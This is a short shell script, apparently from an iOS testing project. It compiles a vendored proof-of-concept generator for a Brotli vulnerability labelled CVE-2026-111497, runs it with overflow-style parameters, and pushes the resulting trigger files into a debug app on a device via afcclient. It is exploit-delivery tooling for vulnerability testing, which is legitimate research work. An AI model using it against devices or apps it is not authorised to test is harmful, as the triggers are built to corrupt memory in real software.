#!/bin/sh
# Generate + push the CVE-2026-111497 trigger pair into the debug app.
# Usage: tools/brotli_trigger.sh <UDID> [bundle-id]
# Generator: MchinaMd57764/CVE-2026-111497-PoC (MIT), vendored verbatim in
# Vendor/external/brotli-111497. Params match the published w13 sample
# (d15=d19=d23=0x7fffffff, b7=0x08); body is a valid literal value.
set -eu
UDID="${1:?usage: tools/brotli_trigger.sh <UDID> [bundle-id]}"
BUNDLE="${2:-ma6x9x.P007OpenOnly.GLVKP6RZ39}"
SRC="$(dirname "$0")/../Vendor/external/brotli-111497/gen_trigger.c"
OUT="${TMPDIR:-/tmp}/brotli_trig_$$"
cc -O2 -o "${OUT}_gen" "$SRC"
"${OUT}_gen" 13 0x41 0x7fffffff 0x7fffffff 0x7fffffff 0x08 "$OUT"
printf 'put %s_first.bin Documents/brotli_first.bin\nput %s_second.bin Documents/brotli_second.bin\nexit\n' "$OUT" "$OUT" \
  | afcclient -u "$UDID" --documents "$BUNDLE"
echo "pushed brotli_first.bin + brotli_second.bin to $BUNDLE"
